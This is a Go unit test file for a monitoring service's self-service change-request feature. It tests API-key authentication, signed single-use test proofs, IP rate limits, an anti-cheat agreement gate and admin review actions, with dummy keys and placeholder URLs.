package change

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"sync"
	"testing"
	"time"

	"monitor/internal/apikey"
	"monitor/internal/config"
	"monitor/internal/onboarding"
)

// --- mock store ---

type mockStore struct {
	mu           sync.Mutex
	records      map[string]*ChangeRequest
	usedTestJobs map[string]struct{}
	consumeCalls int
	nextID       int64
}

func newMockStore() *mockStore {
	return &mockStore{
		records:      make(map[string]*ChangeRequest),
		usedTestJobs: make(map[string]struct{}),
		nextID:       1,
	}
}

func (m *mockStore) ConsumeTestJobID(_ context.Context, jobID string) (bool, error) {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.consumeCalls++
	if _, used := m.usedTestJobs[jobID]; used {
		return false, nil
	}
	m.usedTestJobs[jobID] = struct{}{}
	return true, nil
}

func (m *mockStore) Save(_ context.Context, r *ChangeRequest) error {
	m.mu.Lock()
	defer m.mu.Unlock()
	if _, exists := m.records[r.PublicID]; exists {
		return fmt.Errorf("duplicate public_id")
	}
	r.ID = m.nextID
	m.nextID++
	cp := *r
	m.records[r.PublicID] = &cp
	return nil
}

func (m *mockStore) GetByPublicID(_ context.Context, publicID string) (*ChangeRequest, error) {
	m.mu.Lock()
	defer m.mu.Unlock()
	r, ok := m.records[publicID]
	if !ok {
		return nil, nil
	}
	cp := *r
	return &cp, nil
}

func (m *mockStore) List(_ context.Context, status string, limit, offset int) ([]*ChangeRequest, int, error) {
	m.mu.Lock()
	defer m.mu.Unlock()
	var all []*ChangeRequest
	for _, r := range m.records {
		if status != "" && status != "all" && string(r.Status) != status {
			continue
		}
		cp := *r
		all = append(all, &cp)
	}
	// 按 created_at DESC 排序，与真实实现一致
	sort.Slice(all, func(i, j int) bool {
		return all[i].CreatedAt > all[j].CreatedAt
	})
	total := len(all)
	if offset >= len(all) {
		return nil, total, nil
	}
	end := offset + limit
	if end > len(all) {
		end = len(all)
	}
	return all[offset:end], total, nil
}

func (m *mockStore) Update(_ context.Context, r *ChangeRequest) error {
	m.mu.Lock()
	defer m.mu.Unlock()
	for k, v := range m.records {
		if v.ID == r.ID {
			cp := *r
			m.records[k] = &cp
			return nil
		}
	}
	return fmt.Errorf("not found")
}

func (m *mockStore) CountByIPToday(_ context.Context, ipHash string) (int, error) {
	m.mu.Lock()
	defer m.mu.Unlock()
	start, end := todayRange()
	count := 0
	for _, r := range m.records {
		if r.SubmitterIPHash == ipHash && r.CreatedAt >= start && r.CreatedAt < end {
			count++
		}
	}
	return count, nil
}

func (m *mockStore) DeleteByPublicID(_ context.Context, publicID string) error {
	m.mu.Lock()
	defer m.mu.Unlock()
	if _, ok := m.records[publicID]; !ok {
		return fmt.Errorf("变更请求不存在")
	}
	delete(m.records, publicID)
	return nil
}

// --- test helpers ---

const testHexKey = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"
const testProofSecret = "test-proof-secret-for-unit-tests"

func newTestService(t *testing.T) (*Service, *mockStore) {
	t.Helper()
	cipher, err := apikey.NewKeyCipher(testHexKey)
	if err != nil {
		t.Fatalf("NewKeyCipher: %v", err)
	}
	proofIssuer := apikey.NewProofIssuer(testProofSecret, 5*time.Minute)
	store := newMockStore()
	cfg := &config.ChangeRequestConfig{
		Enabled:        true,
		MaxPerIPPerDay: 5,
	}
	svc := NewService(store, cipher, proofIssuer, cfg)

	// 构建索引
	monitors := []config.ServiceConfig{
		{
			Provider: "testprov", Service: "cc", Channel: "vip",
			APIKey:       "sk-test-key-12345",
			ProviderName: "TestProvider", ChannelName: "VIP Channel",
			Category: "commercial", BaseURL: "https://api.test.com",
		},
		{
			Provider: "other", Service: "cc", Channel: "free",
			APIKey:  "sk-other-key-6789",
			BaseURL: "https://api.other.com",
		},
	}
	svc.UpdateConfig(cfg, monitors)

	return svc, store
}

// --- Auth tests ---

func TestService_Auth_Success(t *testing.T) {
	svc, _ := newTestService(t)

	resp, err := svc.Auth("sk-test-key-12345")
	if err != nil {
		t.Fatalf("Auth: %v", err)
	}
	if len(resp.Candidates) != 1 {
		t.Fatalf("expected 1 candidate, got %d", len(resp.Candidates))
	}
	c := resp.Candidates[0]
	if c.Provider != "testprov" || c.Service != "cc" || c.Channel != "vip" {
		t.Errorf("unexpected candidate: %+v", c)
	}
	if c.MonitorKey != "testprov--cc--vip" {
		t.Errorf("MonitorKey: got %q", c.MonitorKey)
	}
	if c.ProviderName != "TestProvider" {
		t.Errorf("ProviderName: got %q", c.ProviderName)
	}
}

func TestService_Auth_NoMatch(t *testing.T) {
	svc, _ := newTestService(t)

	_, err := svc.Auth("sk-nonexistent-key")
	if err == nil {
		t.Error("expected error for non-matching key")
	}
}

// --- Submit tests ---

func TestService_Submit_NoTestRequired(t *testing.T) {
	svc, _ := newTestService(t)
	ctx := context.Background()

	req := &SubmitRequest{
		APIKey:          "sk-test-key-12345",
		TargetKey:       "testprov--cc--vip",
		ProposedChanges: map[string]string{"provider_name": "NewName"},
		Locale:          "en-US",
	}

	resp, err := svc.Submit(ctx, req, "127.0.0.1")
	if err != nil {
		t.Fatalf("Submit: %v", err)
	}
	if resp.PublicID == "" {
		t.Error("expected non-empty PublicID")
	}
}

func TestService_Submit_WithTestRequired(t *testing.T) {
	svc, _ := newTestService(t)
	ctx := context.Background()

	// 需要一个有效的 proof
	cipher, _ := apikey.NewKeyCipher(testHexKey)
	proofIssuer := apikey.NewProofIssuer(testProofSecret, 5*time.Minute)
	fingerprint := cipher.Fingerprint("sk-test-key-12345")
	proof := proofIssuer.Issue("job-1", "cc", "https://api.new.com", fingerprint)

	req := &SubmitRequest{
		APIKey:            "sk-test-key-12345",
		TargetKey:         "testprov--cc--vip",
		ProposedChanges:   map[string]string{"base_url": "https://api.new.com"},
		TestProof:         proof,
		TestJobID:         "job-1",
		TestType:          "cc",
		TestAPIURL:        "https://api.new.com",
		TestLatency:       150,
		TestHTTPCode:      200,
		AgreementAccepted: true,
	}

	resp, err := svc.Submit(ctx, req, "127.0.0.1")
	if err != nil {
		t.Fatalf("Submit: %v", err)
	}
	if resp.PublicID == "" {
		t.Error("expected non-empty PublicID")
	}
}

// TestService_Submit_TestProofIsSingleUse 锁定 proof 一次性消费：同一 test_job_id 只能兑换一条变更请求。
func TestService_Submit_TestProofIsSingleUse(t *testing.T) {
	svc, store := newTestService(t)
	ctx := context.Background()

	cipher, _ := apikey.NewKeyCipher(testHexKey)
	proofIssuer := apikey.NewProofIssuer(testProofSecret, 5*time.Minute)
	fingerprint := cipher.Fingerprint("sk-test-key-12345")

	req := &SubmitRequest{
		APIKey:            "sk-test-key-12345",
		TargetKey:         "testprov--cc--vip",
		ProposedChanges:   map[string]string{"base_url": "https://api.new.com"},
		TestProof:         proofIssuer.Issue("job-single-use", "cc", "https://api.new.com", fingerprint),
		TestJobID:         "job-single-use",
		TestType:          "cc",
		TestAPIURL:        "https://api.new.com",
		AgreementAccepted: true,
	}

	if _, err := svc.Submit(ctx, req, "127.0.0.1"); err != nil {
		t.Fatalf("首次提交应成功: %v", err)
	}

	// proposed_changes 会被 Submit 就地规范化，重放时按同样内容重建请求
	req.ProposedChanges = map[string]string{"base_url": "https://api.new.com"}
	_, err := svc.Submit(ctx, req, "127.0.0.1")
	if err == nil {
		t.Fatal("复用同一 test_job_id 的提交应被拒绝，实际 nil")
	}
	if !strings.Contains(err.Error(), "已被使用") {
		t.Fatalf("期望 proof 已被使用的拒因，实际: %v", err)
	}

	store.mu.Lock()
	count := len(store.records)
	store.mu.Unlock()
	if count != 1 {
		t.Fatalf("重放被拒后记录数=%d，期望 1", count)
	}
}

// TestService_Submit_DisplayOnlyChangeDoesNotConsumeTestJob 反向守卫：
// 纯展示类变更不涉及探测，不得消费客户端随手附带的 test_job_id（否则会白烧掉一个合法 proof）。
func TestService_Submit_DisplayOnlyChangeDoesNotConsumeTestJob(t *testing.T) {
	svc, store := newTestService(t)

	_, err := svc.Submit(context.Background(), &SubmitRequest{
		APIKey:          "sk-test-key-12345",
		TargetKey:       "testprov--cc--vip",
		ProposedChanges: map[string]string{"channel_name": "New Name"},
		TestJobID:       "job-should-not-be-consumed",
	}, "127.0.0.1")
	if err != nil {
		t.Fatalf("展示类变更应成功: %v", err)
	}

	store.mu.Lock()
	calls := store.consumeCalls
	store.mu.Unlock()
	if calls != 0 {
		t.Fatalf("展示类变更消费了 %d 次 test_job_id，期望 0", calls)
	}
}

func TestService_Submit_DisallowedField(t *testing.T) {
	svc, _ := newTestService(t)
	ctx := context.Background()

	req := &SubmitRequest{
		APIKey:          "sk-test-key-12345",
		TargetKey:       "testprov--cc--vip",
		ProposedChanges: map[string]string{"url": "https://evil.com"},
	}

	_, err := svc.Submit(ctx, req, "127.0.0.1")
	if err == nil {
		t.Error("expected error for disallowed field")
	}
}

// category / sponsor_level 须人工对接，不在用户自助白名单内——
// 持有 API Key 的用户绕过 UI 直接提交也必须被拒（安全边界回归）。
func TestService_Submit_RejectsAdminOnlyFields(t *testing.T) {
	for _, field := range []string{"category", "sponsor_level"} {
		t.Run(field, func(t *testing.T) {
			svc, _ := newTestService(t)
			req := &SubmitRequest{
				APIKey:          "sk-test-key-12345",
				TargetKey:       "testprov--cc--vip",
				ProposedChanges: map[string]string{field: "x"},
			}
			if _, err := svc.Submit(context.Background(), req, "127.0.0.1"); err == nil {
				t.Errorf("expected %q to be rejected for self-service change", field)
			}
		})
	}
}

func TestService_Submit_IPRateLimit(t *testing.T) {
	svc, _ := newTestService(t)
	ctx := context.Background()

	// 提交到限额
	for i := 0; i < 5; i++ {
		req := &SubmitRequest{
			APIKey:          "sk-test-key-12345",
			TargetKey:       "testprov--cc--vip",
			ProposedChanges: map[string]string{"provider_name": fmt.Sprintf("Name%d", i)},
		}
		if _, err := svc.Submit(ctx, req, "10.0.0.1"); err != nil {
			t.Fatalf("Submit #%d: %v", i, err)
		}
	}

	// 第 6 次应被限流
	req := &SubmitRequest{
		APIKey:          "sk-test-key-12345",
		TargetKey:       "testprov--cc--vip",
		ProposedChanges: map[string]string{"provider_name": "Overflow"},
	}
	_, err := svc.Submit(ctx, req, "10.0.0.1")
	if err == nil {
		t.Error("expected rate limit error")
	}
}

func TestService_Submit_KeyMismatch(t *testing.T) {
	svc, _ := newTestService(t)
	ctx := context.Background()

	// 使用 other 的 key 但目标指向 testprov
	req := &SubmitRequest{
		APIKey:          "sk-other-key-6789",
		TargetKey:       "testprov--cc--vip",
		ProposedChanges: map[string]string{"provider_name": "Hack"},
	}

	_, err := svc.Submit(ctx, req, "127.0.0.1")
	if err == nil {
		t.Error("expected error for key/target mismatch")
	}
}

func TestService_Submit_MissingProofWhenTestRequired(t *testing.T) {
	svc, _ := newTestService(t)
	ctx := context.Background()

	req := &SubmitRequest{
		APIKey:            "sk-test-key-12345",
		TargetKey:         "testprov--cc--vip",
		ProposedChanges:   map[string]string{"base_url": "https://api.new.com"},
		AgreementAccepted: true,
		// 没有 proof
	}

	_, err := svc.Submit(ctx, req, "127.0.0.1")
	if err == nil {
		t.Error("expected error when test required but no proof provided")
	}
}

func TestService_Submit_NewAPIKeyRequiresTest(t *testing.T) {
	svc, _ := newTestService(t)
	ctx := context.Background()

	req := &SubmitRequest{
		APIKey:            "sk-test-key-12345",
		TargetKey:         "testprov--cc--vip",
		ProposedChanges:   map[string]string{"provider_name": "NewName"},
		NewAPIKey:         "sk-brand-new-key-abcd",
		AgreementAccepted: true,
		// 没有 proof，但 new key 需要测试
	}

	_, err := svc.Submit(ctx, req, "127.0.0.1")
	if err == nil {
		t.Error("expected error when new API key provided but no proof")
	}
}

func TestService_Submit_EncryptsNewAPIKey(t *testing.T) {
	svc, store := newTestService(t)
	ctx := context.Background()

	cipher, _ := apikey.NewKeyCipher(testHexKey)
	proofIssuer := apikey.NewProofIssuer(testProofSecret, 5*time.Minute)
	newKey := "sk-brand-new-key-abcd"
	fingerprint := cipher.Fingerprint(newKey)
	proof := proofIssuer.Issue("job-2", "cc", "https://api.test.com", fingerprint)

	req := &SubmitRequest{
		APIKey:            "sk-test-key-12345",
		TargetKey:         "testprov--cc--vip",
		ProposedChanges:   map[string]string{"provider_name": "Updated"},
		NewAPIKey:         newKey,
		TestProof:         proof,
		TestJobID:         "job-2",
		TestType:          "cc",
		TestAPIURL:        "https://api.test.com",
		AgreementAccepted: true,
	}

	resp, err := svc.Submit(ctx, req, "192.168.0.1")
	if err != nil {
		t.Fatalf("Submit: %v", err)
	}

	// 验证存储中有加密字段
	cr, _ := store.GetByPublicID(ctx, resp.PublicID)
	if cr.NewKeyEncrypted == "" {
		t.Error("expected encrypted new key")
	}
	if cr.NewKeyFingerprint == "" {
		t.Error("expected new key fingerprint")
	}
	if cr.NewKeyLast4 != "abcd" {
		t.Errorf("NewKeyLast4: got %q, want %q", cr.NewKeyLast4, "abcd")
	}
	// new_api_key 路径同样须盖戳反作弊 re-attestation（门控与盖戳代码不分字段，
	// 但两条触发路径——base_url/new_api_key——各自都要有直接证据）。
	if !cr.AgreementAccepted {
		t.Error("expected AgreementAccepted=true stamped for new_api_key change")
	}
	if cr.AgreementVersion != onboarding.AgreementVersion {
		t.Errorf("AgreementVersion: got %q want %q", cr.AgreementVersion, onboarding.AgreementVersion)
	}
	if cr.AgreementAcceptedAt == nil || *cr.AgreementAcceptedAt == 0 {
		t.Error("expected non-nil AgreementAcceptedAt")
	}
}

// TestService_Submit_RequiresTestWithoutAgreement_Rejected 锁定新增的反作弊 re-attestation
// 门控本身——proof 齐全（否则会被更早的「缺 proof」检查拦下、测不出这个门控是否存在），
// 唯独不设 AgreementAccepted，必须被拒且拒因是协议门控（而非其他校验）。
func TestService_Submit_RequiresTestWithoutAgreement_Rejected(t *testing.T) {
	svc, _ := newTestService(t)
	ctx := context.Background()
	cipher, _ := apikey.NewKeyCipher(testHexKey)
	proofIssuer := apikey.NewProofIssuer(testProofSecret, 5*time.Minute)
	fingerprint := cipher.Fingerprint("sk-test-key-12345")
	proof := proofIssuer.Issue("job-noagree", "cc", "https://api.new.com", fingerprint)
	req := &SubmitRequest{
		APIKey:          "sk-test-key-12345",
		TargetKey:       "testprov--cc--vip",
		ProposedChanges: map[string]string{"base_url": "https://api.new.com"},
		TestProof:       proof,
		TestJobID:       "job-noagree",
		TestType:        "cc",
		TestAPIURL:      "https://api.new.com",
		// 故意不设 AgreementAccepted：即便 proof 齐全，改 base_url 未确认反作弊仍须被拒
	}
	_, err := svc.Submit(ctx, req, "127.0.0.1")
	if err == nil {
		t.Fatal("expected rejection when base_url change lacks anti-cheat re-attestation")
	}
	if !strings.Contains(err.Error(), "禁止监测作弊") {
		t.Errorf("expected agreement-gate error, got: %v", err)
	}
}

// TestService_Submit_NewAPIKeyWithoutAgreement_Rejected 是上一个测试在 new_api_key 路径上的
// 镜像：requiresTest 由 base_url 或 new_api_key 任一触发，门控代码本身不分字段，但两条触发路径
// 都应各自锁定一个直接证据，防止未来门控被误改成只挡 base_url。
func TestService_Submit_NewAPIKeyWithoutAgreement_Rejected(t *testing.T) {
	svc, _ := newTestService(t)
	ctx := context.Background()
	cipher, _ := apikey.NewKeyCipher(testHexKey)
	proofIssuer := apikey.NewProofIssuer(testProofSecret, 5*time.Minute)
	newKey := "sk-brand-new-key-noagree"
	fingerprint := cipher.Fingerprint(newKey)
	proof := proofIssuer.Issue("job-newkey-noagree", "cc", "https://api.test.com", fingerprint)
	req := &SubmitRequest{
		APIKey:          "sk-test-key-12345",
		TargetKey:       "testprov--cc--vip",
		ProposedChanges: map[string]string{"provider_name": "Updated"},
		NewAPIKey:       newKey,
		TestProof:       proof,
		TestJobID:       "job-newkey-noagree",
		TestType:        "cc",
		TestAPIURL:      "https://api.test.com",
		// 故意不设 AgreementAccepted：即便 proof 齐全，new_api_key 变更未确认反作弊仍须被拒
	}
	_, err := svc.Submit(ctx, req, "127.0.0.1")
	if err == nil {
		t.Fatal("expected rejection when new_api_key change lacks anti-cheat re-attestation")
	}
	if !strings.Contains(err.Error(), "禁止监测作弊") {
		t.Errorf("expected agreement-gate error, got: %v", err)
	}
}

func TestService_Submit_RequiresTestWithAgreement_Stamped(t *testing.T) {
	svc, store := newTestService(t)
	ctx := context.Background()
	cipher, _ := apikey.NewKeyCipher(testHexKey)
	proofIssuer := apikey.NewProofIssuer(testProofSecret, 5*time.Minute)
	fingerprint := cipher.Fingerprint("sk-test-key-12345")
	proof := proofIssuer.Issue("job-ac", "cc", "https://api.new.com", fingerprint)
	req := &SubmitRequest{
		APIKey:            "sk-test-key-12345",
		TargetKey:         "testprov--cc--vip",
		ProposedChanges:   map[string]string{"base_url": "https://api.new.com"},
		TestProof:         proof,
		TestJobID:         "job-ac",
		TestType:          "cc",
		TestAPIURL:        "https://api.new.com",
		AgreementAccepted: true,
	}
	resp, err := svc.Submit(ctx, req, "127.0.0.1")
	if err != nil {
		t.Fatalf("Submit: %v", err)
	}
	saved, _ := store.GetByPublicID(ctx, resp.PublicID)
	if saved == nil || !saved.AgreementAccepted {
		t.Fatal("expected AgreementAccepted=true stamped")
	}
	if saved.AgreementVersion != onboarding.AgreementVersion {
		t.Errorf("AgreementVersion: got %q want %q", saved.AgreementVersion, onboarding.AgreementVersion)
	}
	if saved.AgreementAcceptedAt == nil || *saved.AgreementAcceptedAt == 0 {
		t.Error("expected non-nil AgreementAcceptedAt")
	}
}

func TestService_Submit_CosmeticChange_NoAgreementStamp(t *testing.T) {
	svc, store := newTestService(t)
	ctx := context.Background()
	req := &SubmitRequest{
		APIKey:            "sk-test-key-12345",
		TargetKey:         "testprov--cc--vip",
		ProposedChanges:   map[string]string{"provider_name": "NewName"},
		AgreementAccepted: true, // 客户端塞了也应被忽略：cosmetic 不盖戳
	}
	resp, err := svc.Submit(ctx, req, "127.0.0.1")
	if err != nil {
		t.Fatalf("Submit: %v", err)
	}
	saved, _ := store.GetByPublicID(ctx, resp.PublicID)
	if saved.AgreementAccepted || saved.AgreementVersion != "" || saved.AgreementAcceptedAt != nil {
		t.Errorf("cosmetic change must not stamp attestation, got %+v", saved)
	}
}

// --- AdminList tests ---

func TestService_AdminList_DefaultLimits(t *testing.T) {
	svc, store := newTestService(t)
	ctx := context.Background()

	// 种子 25 条记录
	for i := 0; i < 25; i++ {
		cr := makeRequest(fmt.Sprintf("pub-list-%03d", i))
		cr.CreatedAt = int64(1000 + i)
		if err := store.Save(ctx, cr); err != nil {
			t.Fatalf("Save #%d: %v", i, err)
		}
	}

	tests := []struct {
		name      string
		limit     int
		offset    int
		wantCount int // 期望返回的记录数
		wantTotal int
	}{
		{"normal", 20, 0, 20, 25},
		{"zero limit clamps to 20", 0, 0, 20, 25},
		{"negative limit clamps to 20", -1, 0, 20, 25},
		{"over 100 clamps to 20", 200, 0, 20, 25},
		{"negative offset clamps to 0", 10, -1, 10, 25},
		{"offset past end", 10, 30, 0, 25},
		{"small page", 5, 20, 5, 25},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			results, total, err := svc.AdminList(ctx, "", tt.limit, tt.offset)
			if err != nil {
				t.Fatalf("AdminList: %v", err)
			}
			if total != tt.wantTotal {
				t.Errorf("total: got %d, want %d", total, tt.wantTotal)
			}
			if len(results) != tt.wantCount {
				t.Errorf("count: got %d, want %d", len(results), tt.wantCount)
			}
		})
	}
}

// --- AdminGetDetail tests ---

func TestService_AdminGetDetail_WithNewKey(t *testing.T) {
	svc, store := newTestService(t)
	ctx := context.Background()

	cipher, _ := apikey.NewKeyCipher(testHexKey)
	encrypted, _ := cipher.Encrypt("sk-secret-new-key")

	cr := makeRequest("pub-detail")
	cr.NewKeyEncrypted = encrypted
	if err := store.Save(ctx, cr); err != nil {
		t.Fatalf("Save: %v", err)
	}

	got, newKey, err := svc.AdminGetDetail(ctx, "pub-detail")
	if err != nil {
		t.Fatalf("AdminGetDetail: %v", err)
	}
	if got == nil {
		t.Fatal("expected non-nil result")
	}
	if newKey != "sk-secret-new-key" {
		t.Errorf("decrypted new key: got %q, want %q", newKey, "sk-secret-new-key")
	}
}

func TestService_AdminGetDetail_NoNewKey(t *testing.T) {
	svc, store := newTestService(t)
	ctx := context.Background()

	cr := makeRequest("pub-detail-none")
	if err := store.Save(ctx, cr); err != nil {
		t.Fatalf("Save: %v", err)
	}

	got, newKey, err := svc.AdminGetDetail(ctx, "pub-detail-none")
	if err != nil {
		t.Fatalf("AdminGetDetail: %v", err)
	}
	if got == nil {
		t.Fatal("expected non-nil result")
	}
	if newKey != "" {
		t.Errorf("expected empty new key, got %q", newKey)
	}
}

func TestService_AdminGetDetail_NotFound(t *testing.T) {
	svc, _ := newTestService(t)
	ctx := context.Background()

	got, _, err := svc.AdminGetDetail(ctx, "nonexistent")
	if err != nil {
		t.Fatalf("AdminGetDetail: %v", err)
	}
	if got != nil {
		t.Error("expected nil for non-existent")
	}
}

// --- AdminApprove tests ---

func TestService_AdminApprove_Success(t *testing.T) {
	svc, store := newTestService(t)
	ctx := context.Background()

	cr := makeRequest("pub-approve")
	if err := store.Save(ctx, cr); err != nil {
		t.Fatalf("Save: %v", err)
	}

	if err := svc.AdminApprove(ctx, "pub-approve", "looks good"); err != nil {
		t.Fatalf("AdminApprove: %v", err)
	}

	got, _ := store.GetByPublicID(ctx, "pub-approve")
	if got.Status != StatusApproved {
		t.Errorf("Status: got %q, want %q", got.Status, StatusApproved)
	}
	if got.AdminNote != "looks good" {
		t.Errorf("AdminNote: got %q, want %q", got.AdminNote, "looks good")
	}
	if got.ReviewedAt == nil {
		t.Error("ReviewedAt should be set")
	}
}

func TestService_AdminApprove_NotFound(t *testing.T) {
	svc, _ := newTestService(t)
	ctx := context.Background()

	err := svc.AdminApprove(ctx, "nonexistent", "")
	if err == nil {
		t.Error("expected error for non-existent")
	}
}

func TestService_AdminApprove_WrongStatus(t *testing.T) {
	svc, store := newTestService(t)
	ctx := context.Background()

	cr := makeRequest("pub-approve-rej")
	cr.Status = StatusRejected
	if err := store.Save(ctx, cr); err != nil {
		t.Fatalf("Save: %v", err)
	}

	err := svc.AdminApprove(ctx, "pub-approve-rej", "")
	if err == nil {
		t.Error("expected error for non-pending status")
	}
}

// TestService_AdminApprove_RequiresTestWithoutAgreement_Rejected 锁定管理员审批侧的反作弊
// fail-closed 闸：历史/异常记录（迁移前提交，或绕过 Submit 的脏数据）可能出现
// RequiresTest=true 但 AgreementAccepted=false——这类请求即便管理员点了批准也必须被拒，
// 否则「改 base_url/API Key 却未确认反作弊条款」的后门只是从 Submit 挪到了 AdminApprove。
func TestService_AdminApprove_RequiresTestWithoutAgreement_Rejected(t *testing.T) {
	svc, store := newTestService(t)
	ctx := context.Background()

	cr := makeRequest("pub-approve-noagree")
	cr.RequiresTest = true // AgreementAccepted 故意保持零值 false
	if err := store.Save(ctx, cr); err != nil {
		t.Fatalf("Save: %v", err)
	}

	if err := svc.AdminApprove(ctx, "pub-approve-noagree", ""); err == nil {
		t.Fatal("expected error when approving a requires-test change without agreement re-attestation")
	}

	got, _ := store.GetByPublicID(ctx, "pub-approve-noagree")
	if got.Status != StatusPending {
		t.Errorf("Status: got %q, want %q (rejection must not mutate state)", got.Status, StatusPending)
	}
}

// TestService_AdminApprove_RequiresTestWithAgreement_Success 是上一测试的镜像：正常走完
// Submit re-attestation 流程（AgreementAccepted=true）的请求必须能被批准——证明新增的
// fail-closed 闸不会误伤已合规确认的请求。
func TestService_AdminApprove_RequiresTestWithAgreement_Success(t *testing.T) {
	svc, store := newTestService(t)
	ctx := context.Background()

	cr := makeRequest("pub-approve-agreed")
	cr.RequiresTest = true
	cr.AgreementAccepted = true
	if err := store.Save(ctx, cr); err != nil {
		t.Fatalf("Save: %v", err)
	}

	if err := svc.AdminApprove(ctx, "pub-approve-agreed", "looks good"); err != nil {
		t.Fatalf("AdminApprove: %v", err)
	}

	got, _ := store.GetByPublicID(ctx, "pub-approve-agreed")
	if got.Status != StatusApproved {
		t.Errorf("Status: got %q, want %q", got.Status, StatusApproved)
	}
}

// --- AdminReject tests ---

func TestService_AdminReject_Success(t *testing.T) {
	svc, store := newTestService(t)
	ctx := context.Background()

	cr := makeRequest("pub-reject")
	if err := store.Save(ctx, cr); err != nil {
		t.Fatalf("Save: %v", err)
	}

	if err := svc.AdminReject(ctx, "pub-reject", "not acceptable"); err != nil {
		t.Fatalf("AdminReject: %v", err)
	}

	got, _ := store.GetByPublicID(ctx, "pub-reject")
	if got.Status != StatusRejected {
		t.Errorf("Status: got %q, want %q", got.Status, StatusRejected)
	}
}

func TestService_AdminReject_AppliedCannotReject(t *testing.T) {
	svc, store := newTestService(t)
	ctx := context.Background()

	cr := makeRequest("pub-reject-app")
	cr.Status = StatusApplied
	if err := store.Save(ctx, cr); err != nil {
		t.Fatalf("Save: %v", err)
	}

	err := svc.AdminReject(ctx, "pub-reject-app", "too late")
	if err == nil {
		t.Error("expected error for already-applied status")
	}
}

// --- AdminDelete tests ---

func TestService_AdminDelete_Success(t *testing.T) {
	svc, store := newTestService(t)
	ctx := context.Background()

	cr := makeRequest("pub-delete")
	if err := store.Save(ctx, cr); err != nil {
		t.Fatalf("Save: %v", err)
	}

	if err := svc.AdminDelete(ctx, "pub-delete"); err != nil {
		t.Fatalf("AdminDelete: %v", err)
	}

	got, _ := store.GetByPublicID(ctx, "pub-delete")
	if got != nil {
		t.Error("expected nil after delete")
	}
}

func TestService_AdminDelete_NotFound(t *testing.T) {
	svc, _ := newTestService(t)
	ctx := context.Background()

	err := svc.AdminDelete(ctx, "nonexistent")
	if err == nil {
		t.Error("expected error for non-existent")
	}
}

// --- IssueProof test ---

func TestService_IssueProof(t *testing.T) {
	svc, _ := newTestService(t)

	proof := svc.IssueProof("job-1", "cc", "https://api.test.com", "sk-test-key-12345")
	if proof == "" {
		t.Error("expected non-empty proof")
	}

	// Proof 应包含签名和过期时间
	if len(proof) < 10 {
		t.Errorf("proof too short: %q", proof)
	}
}

// --- Negative proof tests ---

func TestService_Submit_ProofWrongJobID(t *testing.T) {
	svc, _ := newTestService(t)
	ctx := context.Background()

	cipher, _ := apikey.NewKeyCipher(testHexKey)
	proofIssuer := apikey.NewProofIssuer(testProofSecret, 5*time.Minute)
	fingerprint := cipher.Fingerprint("sk-test-key-12345")
	// proof 签发时使用 job-good，但提交时用 job-wrong
	proof := proofIssuer.Issue("job-good", "cc", "https://api.new.com", fingerprint)

	req := &SubmitRequest{
		APIKey:            "sk-test-key-12345",
		TargetKey:         "testprov--cc--vip",
		ProposedChanges:   map[string]string{"base_url": "https://api.new.com"},
		TestProof:         proof,
		TestJobID:         "job-wrong",
		TestType:          "cc",
		TestAPIURL:        "https://api.new.com",
		AgreementAccepted: true,
	}

	_, err := svc.Submit(ctx, req, "127.0.0.1")
	if err == nil {
		t.Error("expected error for wrong jobID")
	}
	if !strings.Contains(err.Error(), "签名不匹配") && !strings.Contains(err.Error(), "无效") {
		t.Errorf("unexpected error: %v", err)
	}
}

func TestService_Submit_ProofWrongAPIURL(t *testing.T) {
	svc, _ := newTestService(t)
	ctx := context.Background()

	cipher, _ := apikey.NewKeyCipher(testHexKey)
	proofIssuer := apikey.NewProofIssuer(testProofSecret, 5*time.Minute)
	fingerprint := cipher.Fingerprint("sk-test-key-12345")
	proof := proofIssuer.Issue("job-url", "cc", "https://api.legit.com", fingerprint)

	req := &SubmitRequest{
		APIKey:            "sk-test-key-12345",
		TargetKey:         "testprov--cc--vip",
		ProposedChanges:   map[string]string{"base_url": "https://api.evil.com"},
		TestProof:         proof,
		TestJobID:         "job-url",
		TestType:          "cc",
		TestAPIURL:        "https://api.evil.com", // 与 proof 中的不同
		AgreementAccepted: true,
	}

	_, err := svc.Submit(ctx, req, "127.0.0.1")
	if err == nil {
		t.Error("expected error for wrong apiURL in proof")
	}
}

func TestService_Submit_ProofExpired(t *testing.T) {
	svc, _ := newTestService(t)
	ctx := context.Background()

	cipher, _ := apikey.NewKeyCipher(testHexKey)
	// 负 TTL 确保签发即过期（expiresAt 在过去）
	expiredIssuer := apikey.NewProofIssuer(testProofSecret, -time.Second)
	fingerprint := cipher.Fingerprint("sk-test-key-12345")
	proof := expiredIssuer.Issue("job-exp", "cc", "https://api.new.com", fingerprint)

	req := &SubmitRequest{
		APIKey:            "sk-test-key-12345",
		TargetKey:         "testprov--cc--vip",
		ProposedChanges:   map[string]string{"base_url": "https://api.new.com"},
		TestProof:         proof,
		TestJobID:         "job-exp",
		TestType:          "cc",
		TestAPIURL:        "https://api.new.com",
		AgreementAccepted: true,
	}

	_, err := svc.Submit(ctx, req, "127.0.0.1")
	if err == nil {
		t.Fatal("expected error for expired proof")
	}
	if !strings.Contains(err.Error(), "过期") {
		t.Errorf("expected expiry error, got: %v", err)
	}
}

func TestService_Submit_ProofTampered(t *testing.T) {
	svc, _ := newTestService(t)
	ctx := context.Background()

	cipher, _ := apikey.NewKeyCipher(testHexKey)
	proofIssuer := apikey.NewProofIssuer(testProofSecret, 5*time.Minute)
	fingerprint := cipher.Fingerprint("sk-test-key-12345")
	proof := proofIssuer.Issue("job-tamp", "cc", "https://api.new.com", fingerprint)

	// 篡改签名部分（翻转第一个字符）
	tampered := "x" + proof[1:]

	req := &SubmitRequest{
		APIKey:            "sk-test-key-12345",
		TargetKey:         "testprov--cc--vip",
		ProposedChanges:   map[string]string{"base_url": "https://api.new.com"},
		TestProof:         tampered,
		TestJobID:         "job-tamp",
		TestType:          "cc",
		TestAPIURL:        "https://api.new.com",
		AgreementAccepted: true,
	}

	_, err := svc.Submit(ctx, req, "127.0.0.1")
	if err == nil {
		t.Error("expected error for tampered proof signature")
	}
}

func TestService_Submit_ProofWrongKeyFingerprint(t *testing.T) {
	svc, _ := newTestService(t)
	ctx := context.Background()

	cipher, _ := apikey.NewKeyCipher(testHexKey)
	proofIssuer := apikey.NewProofIssuer(testProofSecret, 5*time.Minute)
